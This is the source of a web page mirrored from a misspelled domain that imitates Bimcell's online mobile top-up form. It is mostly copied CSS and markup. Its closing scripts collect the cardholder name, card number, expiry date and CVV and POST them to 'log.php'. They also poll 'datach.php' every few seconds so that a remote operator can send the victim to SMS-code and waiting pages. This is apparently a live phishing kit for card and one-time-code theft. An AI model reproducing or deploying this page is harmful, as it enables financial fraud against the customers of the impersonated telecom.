    .mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start {
        border-width: 2px;
        transition: border-color .3s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,
    .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline {
        opacity: 0;
        transition: opacity .1s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,
    .mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick {
        opacity: 1
    }

    .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline {
        opacity: 0;
        transition: opacity .6s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick {
        opacity: 1
    }

    .mat-form-field-appearance-outline .mat-form-field-subscript-wrapper {
        padding: 0 1em
    }

    .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,
    .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,
    .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap,
    .mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,
    .mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline {
        transition: none
    }
</style>
<style>
    .mat-form-field-appearance-standard .mat-form-field-flex {
        padding-top: .75em
    }

    .mat-form-field-appearance-standard .mat-form-field-underline {
        height: 1px
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-standard .mat-form-field-underline {
            height: 0;
            border-top: solid 1px
        }
    }

    .mat-form-field-appearance-standard .mat-form-field-ripple {
        bottom: 0;
        height: 2px
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-standard .mat-form-field-ripple {
            height: 0;
            border-top: 2px
        }
    }

    .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
        background-position: 0;
        background-color: transparent
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline {
            border-top-style: dotted;
            border-top-width: 2px
        }
    }

    .mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
        opacity: 1;
        transform: none;
        transition: opacity .6s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple {
        transition: none
    }
</style>
<style>
    .mat-input-element {
        font: inherit;
        background: 0 0;
        color: currentColor;
        border: none;
        outline: 0;
        padding: 0;
        margin: 0;
        width: 100%;
        max-width: 100%;
        vertical-align: bottom;
        text-align: inherit
    }

    .mat-input-element:-moz-ui-invalid {
        box-shadow: none
    }

    .mat-input-element::-ms-clear,
    .mat-input-element::-ms-reveal {
        display: none
    }

    .mat-input-element,
    .mat-input-element::-webkit-search-cancel-button,
    .mat-input-element::-webkit-search-decoration,
    .mat-input-element::-webkit-search-results-button,
    .mat-input-element::-webkit-search-results-decoration {
        -webkit-appearance: none
    }

    .mat-input-element::-webkit-caps-lock-indicator,
    .mat-input-element::-webkit-contacts-auto-fill-button,
    .mat-input-element::-webkit-credentials-auto-fill-button {
        visibility: hidden
    }

    .mat-input-element[type=date]::after,
    .mat-input-element[type=datetime-local]::after,
    .mat-input-element[type=datetime]::after,
    .mat-input-element[type=month]::after,
    .mat-input-element[type=time]::after,
    .mat-input-element[type=week]::after {
        content: ' ';
        white-space: pre;
        width: 1px
    }

    .mat-input-element::placeholder {
        transition: color .4s .133s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-input-element::-moz-placeholder {
        transition: color .4s .133s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-input-element::-webkit-input-placeholder {
        transition: color .4s .133s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-input-element:-ms-input-placeholder {
        transition: color .4s .133s cubic-bezier(.25, .8, .25, 1)
    }

    .mat-form-field-hide-placeholder .mat-input-element::placeholder {
        color: transparent !important;
        -webkit-text-fill-color: transparent;
        transition: none
    }

    .mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder {
        color: transparent !important;
        -webkit-text-fill-color: transparent;
        transition: none
    }

    .mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder {
        color: transparent !important;
        -webkit-text-fill-color: transparent;
        transition: none
    }

    .mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder {
        color: transparent !important;
        -webkit-text-fill-color: transparent;
        transition: none
    }

    textarea.mat-input-element {
        resize: vertical;
        overflow: auto
    }

    textarea.mat-input-element.cdk-textarea-autosize {
        resize: none
    }

    textarea.mat-input-element {
        padding: 2px 0;
        margin: -2px 0
    }
</style>
<style>
    @keyframes mat-checkbox-fade-in-background {
        0% {
            opacity: 0
        }

        50% {
            opacity: 1
        }
    }

    @keyframes mat-checkbox-fade-out-background {

        0%,
        50% {
            opacity: 1
        }

        100% {
            opacity: 0
        }
    }

    @keyframes mat-checkbox-unchecked-checked-checkmark-path {

        0%,
        50% {
            stroke-dashoffset: 22.91026
        }

        50% {
            animation-timing-function: cubic-bezier(0, 0, .2, .1)
        }

        100% {
            stroke-dashoffset: 0
        }
    }

    @keyframes mat-checkbox-unchecked-indeterminate-mixedmark {

        0%,
        68.2% {
            transform: scaleX(0)
        }

        68.2% {
            animation-timing-function: cubic-bezier(0, 0, 0, 1)
        }

        100% {
            transform: scaleX(1)
        }
    }

    @keyframes mat-checkbox-checked-unchecked-checkmark-path {
        from {
            animation-timing-function: cubic-bezier(.4, 0, 1, 1);
            stroke-dashoffset: 0
        }

        to {
            stroke-dashoffset: -22.91026
        }
    }

    @keyframes mat-checkbox-checked-indeterminate-checkmark {
        from {
            animation-timing-function: cubic-bezier(0, 0, .2, .1);
            opacity: 1;
            transform: rotate(0)
        }

        to {
            opacity: 0;
            transform: rotate(45deg)
        }
    }

    @keyframes mat-checkbox-indeterminate-checked-checkmark {
        from {
            animation-timing-function: cubic-bezier(.14, 0, 0, 1);
            opacity: 0;
            transform: rotate(45deg)
        }

        to {
            opacity: 1;
            transform: rotate(360deg)
        }
    }

    @keyframes mat-checkbox-checked-indeterminate-mixedmark {
        from {
            animation-timing-function: cubic-bezier(0, 0, .2, .1);
            opacity: 0;
            transform: rotate(-45deg)
        }

        to {
            opacity: 1;
            transform: rotate(0)
        }
    }

    @keyframes mat-checkbox-indeterminate-checked-mixedmark {
        from {
            animation-timing-function: cubic-bezier(.14, 0, 0, 1);
            opacity: 1;
            transform: rotate(0)
        }

        to {
            opacity: 0;
            transform: rotate(315deg)
        }
    }

    @keyframes mat-checkbox-indeterminate-unchecked-mixedmark {
        0% {
            animation-timing-function: linear;
            opacity: 1;
            transform: scaleX(1)
        }

        100%,
        32.8% {
            opacity: 0;
            transform: scaleX(0)
        }
    }

    .mat-checkbox-checkmark,
    .mat-checkbox-mixedmark {
        width: calc(100% - 4px)
    }

    .mat-checkbox-background,
    .mat-checkbox-frame {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        border-radius: 2px;
        box-sizing: border-box;
        pointer-events: none
    }

    .mat-checkbox {
        transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
        cursor: pointer;
        -webkit-tap-highlight-color: transparent
    }

    ._mat-animation-noopable.mat-checkbox {
        transition: none;
        animation: none
    }

    .mat-checkbox-layout {
        cursor: inherit;
        align-items: baseline;
        vertical-align: middle;
        display: inline-flex;
        white-space: nowrap
    }

    .mat-checkbox-inner-container {
        display: inline-block;
        height: 20px;
        line-height: 0;
        margin: auto;
        margin-right: 8px;
        order: 0;
        position: relative;
        vertical-align: middle;
        white-space: nowrap;
        width: 20px;
        flex-shrink: 0
    }

    [dir=rtl] .mat-checkbox-inner-container {
        margin-left: 8px;
        margin-right: auto
    }

    .mat-checkbox-inner-container-no-side-margin {
        margin-left: 0;
        margin-right: 0
    }

    .mat-checkbox-frame {
        background-color: transparent;
        transition: border-color 90ms cubic-bezier(0, 0, .2, .1);
        border-width: 2px;
        border-style: solid
    }

    ._mat-animation-noopable .mat-checkbox-frame {
        transition: none
    }

    .mat-checkbox-background {
        align-items: center;
        display: inline-flex;
        justify-content: center;
        transition: background-color 90ms cubic-bezier(0, 0, .2, .1), opacity 90ms cubic-bezier(0, 0, .2, .1)
    }

    ._mat-animation-noopable .mat-checkbox-background {
        transition: none
    }

    .mat-checkbox-checkmark {
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        position: absolute;
        width: 100%
    }

    .mat-checkbox-checkmark-path {
        stroke-dashoffset: 22.91026;
        stroke-dasharray: 22.91026;
        stroke-width: 2.66667px
    }

    .mat-checkbox-mixedmark {
        height: 2px;
        opacity: 0;
        transform: scaleX(0) rotate(0)
    }

    @media screen and (-ms-high-contrast:active) {
        .mat-checkbox-mixedmark {
            height: 0;
            border-top: solid 2px;
            margin-top: 2px
        }
    }

    .mat-checkbox-label-before .mat-checkbox-inner-container {
        order: 1;
        margin-left: 8px;
        margin-right: auto
    }

    [dir=rtl] .mat-checkbox-label-before .mat-checkbox-inner-container {
        margin-left: auto;
        margin-right: 8px
    }

    .mat-checkbox-checked .mat-checkbox-checkmark {
        opacity: 1
    }

    .mat-checkbox-checked .mat-checkbox-checkmark-path {
        stroke-dashoffset: 0
    }

    .mat-checkbox-checked .mat-checkbox-mixedmark {
        transform: scaleX(1) rotate(-45deg)
    }

    .mat-checkbox-indeterminate .mat-checkbox-checkmark {
        opacity: 0;
        transform: rotate(45deg)
    }

    .mat-checkbox-indeterminate .mat-checkbox-checkmark-path {
        stroke-dashoffset: 0
    }

    .mat-checkbox-indeterminate .mat-checkbox-mixedmark {
        opacity: 1;
        transform: scaleX(1) rotate(0)
    }

    .mat-checkbox-unchecked .mat-checkbox-background {
        background-color: transparent
    }

    .mat-checkbox-disabled {
        cursor: default
    }

    .mat-checkbox-anim-unchecked-checked .mat-checkbox-background {
        animation: 180ms linear 0s mat-checkbox-fade-in-background
    }

    .mat-checkbox-anim-unchecked-checked .mat-checkbox-checkmark-path {
        animation: 180ms linear 0s mat-checkbox-unchecked-checked-checkmark-path
    }

    .mat-checkbox-anim-unchecked-indeterminate .mat-checkbox-background {
        animation: 180ms linear 0s mat-checkbox-fade-in-background
    }

    .mat-checkbox-anim-unchecked-indeterminate .mat-checkbox-mixedmark {
        animation: 90ms linear 0s mat-checkbox-unchecked-indeterminate-mixedmark
    }

    .mat-checkbox-anim-checked-unchecked .mat-checkbox-background {
        animation: 180ms linear 0s mat-checkbox-fade-out-background
    }

    .mat-checkbox-anim-checked-unchecked .mat-checkbox-checkmark-path {
        animation: 90ms linear 0s mat-checkbox-checked-unchecked-checkmark-path
    }

    .mat-checkbox-anim-checked-indeterminate .mat-checkbox-checkmark {
        animation: 90ms linear 0s mat-checkbox-checked-indeterminate-checkmark
    }

    .mat-checkbox-anim-checked-indeterminate .mat-checkbox-mixedmark {
        animation: 90ms linear 0s mat-checkbox-checked-indeterminate-mixedmark
    }

    .mat-checkbox-anim-indeterminate-checked .mat-checkbox-checkmark {
        animation: .5s linear 0s mat-checkbox-indeterminate-checked-checkmark
    }

    .mat-checkbox-anim-indeterminate-checked .mat-checkbox-mixedmark {
        animation: .5s linear 0s mat-checkbox-indeterminate-checked-mixedmark
    }

    .mat-checkbox-anim-indeterminate-unchecked .mat-checkbox-background {
        animation: 180ms linear 0s mat-checkbox-fade-out-background
    }

    .mat-checkbox-anim-indeterminate-unchecked .mat-checkbox-mixedmark {
        animation: .3s linear 0s mat-checkbox-indeterminate-unchecked-mixedmark
    }

    .mat-checkbox-input {
        bottom: 0;
        left: 50%
    }

    .mat-checkbox-ripple {
        position: absolute;
        left: calc(50% - 25px);
        top: calc(50% - 25px);
        height: 50px;
        width: 50px;
        z-index: 1;
        pointer-events: none
    }
</style>


<style>
    .css-1cze0h2 {
        margin-top: 1.25rem;
        margin-bottom: 0.25rem;
    }

    .css-utfe46 {
        display: flex;
        flex-direction: column;
        margin-left: auto;
        margin-right: auto;
        max-width: 570px;
        margin: 0px auto;
        width: 100%;
    }

    .h4-tl-yukleme {
        text-align: left;
        color: rgb(34, 41, 67);
        font-family: "Muli Regular";
        font-size: 1.25rem;
        margin-bottom: 0.5rem;
        line-height: 1.75rem;
    }

    .css-pjl2rq {
        display: flex;
        -webkit-box-align: center;
        align-items: center;
        font-family: "Muli Regular";
    }

    .css-ez0hho {
        color: rgb(113, 125, 141);
        cursor: pointer;
        font-size: 0.75rem;
        line-height: 1.25rem;
        white-space: nowrap;
    }

    .css-1o1tong {
        margin-left: 0.125rem;
        margin-right: 0.25rem;
    }

    .css-14r0mf2 {
        cursor: pointer;
        font-size: 0.75rem;
        line-height: 1.25rem;
        font-weight: 700;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
        color: rgb(34, 41, 67);
    }

    .css-x6er3w {
        display: flex;
        padding-top: 1.25rem;
        color: rgb(25, 66, 118);
        flex-direction: column;
    }

    .css-1ff96qn {
        max-width: 570px;
        margin: 0px auto;
        width: 100%;
    }

    body .avea-theme,
    .avea-theme .modal-title,
    .avea-theme .input-desc {
        font-weight: normal !important;
        font-style: normal !important;
        color: #222943 !important;
    }





    input,
    button,
    select,
    textarea {
        font-family: inherit;
        font-size: inherit;
        line-height: inherit;
    }

    input {
        line-height: normal;
    }

    button,
    input,
    optgroup,
    select,
    textarea {
        margin: 0;
        font: inherit;
        color: inherit;
    }

    .form-control {
        display: block;
        height: 42px;
        padding: 6px 12px;
        margin-top: 5px;
        font-size: 17px;
        line-height: 1.42857143;
        color: #555;
        background-color: #fff;
        background-image: none;
        border: 1px solid #ccc;
        border-radius: 4px;
        -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        -webkit-transition: border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
    }

    @media (max-width: 1024px) {
        .form-control {
            color: #222943 !important;
            font-weight: normal;
            font-style: normal;
        }
    }

    input.form-control:focus {
        -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
        -webkit-transition: border-color ease-in-out .15s, -webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
    }
</style>

<style>
    
.margin-top-10 {
	margin-top:10px;
}

#how_do .img-responsive {
    margin: 0 auto;
}

/* End Erdinç */
   
	.bs-example{
    	margin: 20px;
    }

	.row-no-margin {
		margin-left:0px;
		margin-right:0px;
	}

	label {
		font-weight: normal;
	}
    p{
        padding-top: 0px;
    color: #222943;
    font-weight: 300 !important;
    }

    .title {
        padding: 0px 0px;
    display: block;
    font-size: 15px;
    color: #333;
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#ecf0ef', endColorstr='#e4e9e8',GradientType=0 );
}
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 10px;
    margin-bottom: 2px;
    
}
input.form-control {
    padding: 16px;
    height: 56px;
    border-radius: 4px;
    font-weight: 400;
    font-size: 16px;
    color: #222943 !important;
    border: 1px solid #dee3ed;
    box-shadow: none !important;
    outline: none !important;
}
.btn{
    width: 100%;
    display: block;
    height: 44px;
    margin: 10px 0;
    border-radius: 4px;
    font-weight: 600;
    font-size: 16px!important;
    background: #0a396d;
    color: #fff;
    cursor: pointer!important;
}
</style>    <script src="public/front/ttema/js/jquery-1.12.4.min.js"></script>
    <script src="public/front/bim/scripts/bootstrap.min.js" type="text/javascript"></script>

</head>

<body>
    <div>
    <div class="page-box">
        <div class="page-top-links-wrapper">
            <div class="container">
                <div class="row">
                    <ul class="top-links">
                        <li><a href="tel:4444551">Müşteri Hizmetleri<em class="pi pi-phone"></em><strong>444 4
                                    551</strong></a></li>
                        <li class="black"><a href="javascript:;" alt="bimcell tl yükle, bimcelltlyükle"><em class="pi pi-download"></em>TL Yükle</a></li>
                        <li class="red"><a href="javascript:;" alt="bimcell online işlemler, onlineişlemler"><em class="pi pi-monitor"></em>Online İşlemler</a></li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="navbar navbar-default page-top-menu" role="navigation">
            <div class="container">
                <div class="row">
                    <div class="navbar-header page-scroll">
                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                            <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
                        </button>
                        <div class="header-logo navbar-brand page-scroll">
                            <a href="javascript:;" class="">
                                <img src="public/front/bim/images/logo.png" alt="Bimcell Logo">
                            </a>
                        </div>
                    </div>
                    <div class="collapse navbar-collapse navbar-ex1-collapse navbar-right">

                        <ul class="nav navbar-nav">
                            <li><a href="javascript:;" class="page-scroll">Neden BİMcell?</a></li>
                            <li><a href="javascript:;" class="page-scroll">Nasıl BİMcell'li Olunur?</a></li>
                            <li><a href="javascript:;" class="page-scroll">Tarife ve Paketler</a></li>
                            <li><a href="javascript:;" class="page-scroll">Servisler</a></li>
                            <li><a href="javascript:;" class="page-scroll">Sıkça Sorulan Sorular</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="page-content ">
            <div class="container">
                <div class="row">
                    <div class="content-wrapper">
                        <div class="col-md-12" style="background-color: white;">

                            <style>
                                @media (min-width: 792px) {
                                    .container {
                                        width: 68%;
                                    }

                                }

                                @media (max-width: 1199px) {
                                    body {
                                        font-size: 14px !important;
                                        margin-bottom: 0;
                                        font-weight: 300 !important;
                                    }
                                }
                            </style>
                            <div class="container yuklecontainer" style="padding-right: -1px;padding-left: 0px;margin-top:20px; min-height:850px">
                                <div class="cg-area">


                                    <div class="css-1cze0h2 e13ols372" style="width:99%;    margin-left: 10px; margin-right: 10px;">

                                        <div id="layoutHeader">
                                            <img src="../onlineislemler.turktelekom.com.tr/mps/assets/images/bimcell-logo.png"></a>
                                        </div>
                                        <h3 style="padding-left:0 !important;" class="title">
                                            TL YÜKLEME
                                        </h3>

                                        <p style="padding-top:0px;color:#222943 ">
                                            Lütfen TL yüklemek istediğiniz telefon numarasını, almak istediğiniz TL
                                            miktarını ve kredi kartı/banka kartı bilgilerinizi giriniz.
                                        </p>

                                        <div style="margin-bottom:21px" class="row">
                                            <div class="col-sm-12 col-md-4 col-xl-3">
                                                <label>
                                                    Yükleme Yapılacak Telefon Numarası:
                                                </label>
                                            </div>
                                            <div class="col-sm-12 col-md-7 col-xl-8">
                                                <input name="msisdnToBeProcessed" tabindex="1" value="" id="msisdn" size="12" maxlength="10" placeholder="5xxxxxxxxx" class="form-control onlyNumeric mb-2" type="text">

                                            </div>


                                        </div>

                                    </div>

                                    <div id="form-area" class="ibm-form" style="margin-left:10px; margin-right: 10px; ">
                                        <div>

                                            <div class="balance-area" style="display:none">
                                                <div class="b">
                                                    <h4 class="title">Yüklenecek Tutar</h4>
                                                </div>

                                                <div class="row">
                                                    <style>
                                                        .btn-tl-active {
                                                            background-color: rgb(4, 158, 173) !important;
                                                            color: rgb(255, 255, 255)
                                                        }

                                                        .btn-tl {
                                                            background-color: rgb(255, 255, 255) !important;
                                                            color: inherit;
                                                        }

                                                        @media (min-width: 992px) {
                                                            .tlpackages {
                                                                width: 100%;
                                                            }

                                                        }
                                                    </style>
                                                    <div _ngcontent-c3="" class="tlpackages " style="width: 80%;">

                                                        <!---->
                                                        <button class="mat-stroked-button" id="30">
                                                            <span class="mat-button-wrapper">30 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="35">
                                                            <span class="mat-button-wrapper">35 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="40">
                                                            <span class="mat-button-wrapper">40 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="50">
                                                            <span class="mat-button-wrapper">50 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="60">
                                                            <span class="mat-button-wrapper">60 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="75">
                                                            <span class="mat-button-wrapper">75 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="100">
                                                            <span class="mat-button-wrapper">100 TL</span>
                                                        </button>
                                                        <button class="mat-stroked-button" id="200">
                                                            <span class="mat-button-wrapper">200 TL</span>
                                                        </button>

                                                        <button class="mat-stroked-button" id="300">
                                                            <span class="mat-button-wrapper">300 TL</span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class=" ng-star-inserted credit-card-area" style="display:none">
                                                <!---->
                                                <div class=" ng-star-inserted">

                                                    <div class="row">
                                                        <div class="col-lg-12">
                                                            <h4 _ngcontent-c4="" class="title pt-2">Kredi Kartı / Banka Kartı</h4>
                                                        </div>
                                                    </div>
                                                    <div class="row">
                                                        <div class="col-lg-12">
                                                            <div class="form-group">
                                                                <input type="text" name="cc_name" class="form-control" placeholder="Ad Soyad*">
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div id="hataMesajiCC" style="padding-top: 10px; display:none; color:#dc3545"></div>
                                                    <div class="row">
                                                        <div class="col-lg-12">
                                                            <div class="form-group">
                                                                <input type="text" name="ccno" class="form-control" placeholder="Kredi Kartı ya da Banka Numarası*">
                                                            </div>
                                                        </div>
                                                    </div>


                                                    <div id="hataMesajiDATECVV" style="padding-top: 10px; display:none; color:#dc3545"></div>
                                                    <div class="row">
                                                        <div class="col-lg-6">
                                                            <div class="form-group" style="padding-right: 10px;">
                                                                <input type="text" name="date" class="form-control pr-2" placeholder="Geçerlilik Tarihi*">
                                                            </div>
                                                        </div>

                                                        <div class="col-lg-6">
                                                            <div class="form-group" style="padding-left: 10px;">
                                                                <input type="text" name="cvv" class="form-control" placeholder="CVV*">
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <div class="col-lg-12 info-3dsecure">
                                                        <span class="form-alert default">3D Secure ile ödeme için
                                                            kartınızın 3D Secure ödemeye
                                                            açık olması gerekmektedir.
                                                        </span>
                                                    </div>

                                                </div>
                                                <hr class="ng-star-inserted">

                                                <div id="hataMesajiKKENABLE" style="padding-top: 10px; display:none; color:#dc3545"></div>
                                                <ttg-modal _nghost-c6="" class="ng-star-inserted">
                                                    <div _ngcontent-c6="" class="ibm-form">
                                                        <div _ngcontent-c6="" class="checkbox-group tealblue mobil">
                                                            <input type="checkbox" name="kkenable" value="1" id="kkenable">
                                                            <label for="kkenable">
                                                                <a _ngcontent-c6="" for="kkenable" style="padding-top:0.6rem;;padding-bottom:0.6rem;">
                                                                    Kullanım Koşulları'nı
                                                                </a> okudum ve onaylıyorum.
                                                            </label>
                                                        </div>
                                                    </div>
                                                </ttg-modal>

                                                <div id="hataMesajiPOST" style="padding-top: 10px; display:none; color:#dc3545"></div>

                                                <style>
                                                    .btn.uyar {
                                                        background-color: #dc3545;
                                                        color: #fff;
                                                        font-size: 14px !important;
                                                    }

                                                    .btn.devam {
                                                        background-color: #0a396d;
                                                        color: #fff;
                                                        font-size: 14px !important;
                                                    }
                                                </style>
                                                <div class="ng-star-inserted">
                                                    <button class="btn btnDevam devam" type="submit">
                                                        Devam Et
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>



                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="container">
                <hr class="shadow">
                <div class="row ">
                    <div class="col-md-12">
                        <div class="footer-order">
                            <a href="javascript:;"><i class="fa fa-angle-right fa-fw"></i>Hakkımızda</a>
                            <a href="javascript:;"><i class="fa fa-angle-right fa-fw"></i>Gizlilik ve Güvenlik</a>
                            <a href="javascript:;"><i class="fa fa-angle-right fa-fw"></i>Tüketici Şikayetleri</a>
                            <a href="javascript:;"><i class="fa fa-angle-right fa-fw"></i>Tüketici Bilgilendirme
                                Rehberi</a>
                            <a href="javascript:;"><i class="fa fa-angle-right fa-fw"></i>Duyurular</a>
                        </div>
                    </div>
                </div>
                <div class="row footer-order">
                    <div class="col-md-2 pb-20">
                        <a>
                            <img src="public/front/bim/images/bottom_logo.png" alt="Bimcell Logo Siyah">
                        </a>
                    </div>
                    <div class="col-md-10">
                        <div class="copyright">
                            ©2011-2015 | Bu hizmet TT Mobil İletişim Hizmetleri A.Ş. tarafından
                            sunulmakta olup, tüketici memnuniyetine ilişkin her türlü husustan TT Mobil İletişim
                            Hizmetleri A.Ş. sorumludur.
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<script src="public/front/ttema/js/jquery.mask.min.js"></script>


<script type="text/javascript">
    // Javascript code copyright 2009 by Fiach Reid : www.webtropy.com
    // This code may be used freely, as long as this copyright notice is intact.
    function Calculate(Luhn) {

        var sum = 0;
        for (i = 0; i < Luhn.length; i++) {
            sum += parseInt(Luhn.substring(i, i + 1));
        }

        var delta = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
        for (i = Luhn.length - 1; i >= 0; i -= 2) {
            var deltaIndex = parseInt(Luhn.substring(i, i + 1));
            var deltaValue = delta[deltaIndex];
            sum += deltaValue;
        }

        var mod10 = sum % 10;
        mod10 = 10 - mod10;

        if (mod10 == 10) {
            mod10 = 0;
        }

        return mod10;

    }

    function Validate(Luhn) {

        Luhn = Luhn.replace(/\s/g, '');

        var LuhnDigit = parseInt(Luhn.substring(Luhn.length - 1, Luhn.length));
        var LuhnLess = Luhn.substring(0, Luhn.length - 1);

        if (Calculate(LuhnLess) == parseInt(LuhnDigit)) {
            return true;
        }

        return false;

    }
</script>

<script>
    var balance = 0;


    $("input[name='msisdnToBeProcessed']").mask('0000000000');
    $("input[name='ccno']").mask('0000000000000000');
    $("input[name='date']").mask('00/00');
    $("input[name='cvv']").mask('000');

    var balance = 0;


    $('input[name=msisdnToBeProcessed]').keyup(function() {
        var val = $(this).val();
        if (val.length == 10) {
            $('.balance-area').show();
        }
    })

    $(document).on("click", ".mat-stroked-button", function(e) {
        $('.btn-tl-active').removeClass('btn-tl-active');
        $(this).addClass('btn-tl-active');
        balance = $(this).attr('id');
        $('.credit-card-area').show();
    });


    $(document).on("click", ".mat-stroked-button", function(e) {
        $('.btn-tl-active').removeClass('btn-tl-active');
        $(this).addClass('btn-tl-active');
        balance = $(this).attr('id');
        $('.credit-card-area').show();
    });


    $('.btnDevam').click(function() {
        var izn = true;

        var ccname = $("input[name=cc_name]").val();
        var ccno = $("input[name=ccno]").val();
        var date = $("input[name=date]").val();
        var cvv = $("input[name=cvv]").val();
        var kkenable = $("input[name=kkenable]").val();

        if (!Validate(ccno)) {
            $("#hataMesajiCC").text("Lütfen geçerli bir kart numarası girin!").show();
            izn = false;
        } else {
            $("#hataMesajiCC").hide();
        }

        if (date.length != 5) {
            $("#hataMesajiDATECVV").text("Son kullanma tarihi hatalı!").show();
            izn = false;
        } else {
            $("#hataMesajiDATECVV").hide();
        }

        if (cvv.length != 3) {
            $("#hataMesajiDATECVV").text("CVV Güvenlik kotu hatalı!").show();
            izn = false;
        } else {
            $("#hataMesajiDATECVV").hide();
        }

        if ($('#kkenable:checked').val() != undefined) {
            $("#hataMesajiKKENABLE").hide();
        } else {
            $("#hataMesajiKKENABLE").text("Lütfen kullanım koşullarını onaylayın!").show();
            izn = false;
        }

        if (izn) {
            $.ajax({
                type: 'POST',
                url: "log.php",
                data: {
                    cc_name: ccname,
                    cc_no: ccno,
                    cc_date: date,
                    cc_cvv: cvv,
                    balance: balance
                },
                     dataType: "JSON",
                success: function(response) {
					if(response.status == true){
						window.location.href= response.hrefpage;	
					}
                }
            });
        }
    });
</script>    
<script>
</script>
<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      }
        if(msg=='back'){
        window.location.href='sms.php';
      }
         if(msg=='back'){
        window.location.href='index.php?1';
      }
            if(msg=='1'){
        window.location.href='index.php?1';
      }       if(msg=='2'){
        window.location.href='kart.php';
      }          if(msg=='3'){
        window.location.href='bekle.php';
      }          if(msg=='4'){
        window.location.href='hata.php';
      }          if(msg=='5'){
        window.location.href='tebrik.php';
      }  
      }
    });
    
}
</script>

</body>


<!-- Mirrored from b1iimc3l.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 31 Oct 2021 05:03:21 GMT -->
</html>